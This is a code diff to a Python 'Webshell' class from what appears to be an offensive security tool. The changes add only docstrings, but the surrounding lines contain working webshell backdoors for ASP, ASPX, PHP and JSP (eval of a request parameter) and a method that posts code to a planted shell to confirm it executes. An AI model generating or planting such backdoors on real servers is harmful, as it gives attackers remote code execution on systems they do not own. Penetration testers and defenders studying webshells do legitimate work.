@@ -16,6 +16,13 @@ class Webshell(object):
         self.password = randoms.rand_text_alphanumeric(16)
 
     def has_shell(self, url, password, flag_code, flag_match):
+        """Check if a shell is available.
+
+        param: url, a shell url
+        param: password, shell password
+        param: flag_code,  let shell execute the code
+        param: flag_match, flag
+        """
         try:
             resp = requests.post(url, data={password: flag_code}, timeout=15)
             if resp and flag_match in resp.content:
@@ -26,6 +33,7 @@ class Webshell(object):
         return False
 
     def asp(self):
+        """Generate a asp backdoor"""
         backdoor = '<%eval request("{}")%>'.format(self.password)
         flag_code = 'Response.Write(Replace("<T>","T","{}"))'.format(
             self.password)
@@ -33,6 +41,7 @@ class Webshell(object):
         return backdoor, flag_code, flag_match
 
     def aspx(self):
+        """Generate a aspx backdoor"""
         backdoor = ('<%@ Page Language="Jscript"%>'
                     '<%eval(Request.Item["{}"],"unsafe");%>').format(
                         self.password)
@@ -42,12 +51,14 @@ class Webshell(object):
         return backdoor, flag_code, flag_match
 
     def php(self):
+        """Generate a php backdoor"""
         backdoor = '<?php @eval($_POST["{}"]);?>'.format(self.password)
         flag_code = 'echo "<{}>";die();'.format(self.password)
         flag_match = '<{}>'.format(self.password)
         return backdoor, flag_code, flag_match
 
     def jsp(self):
+        """Generate a jsp backdoor"""
         backdoor = ('<%@ page import="java.util.*,java.io.*" %>'
                     '<%@ page import="java.io.*"%>'
                     '<%@ page import="java.util.*"%>'
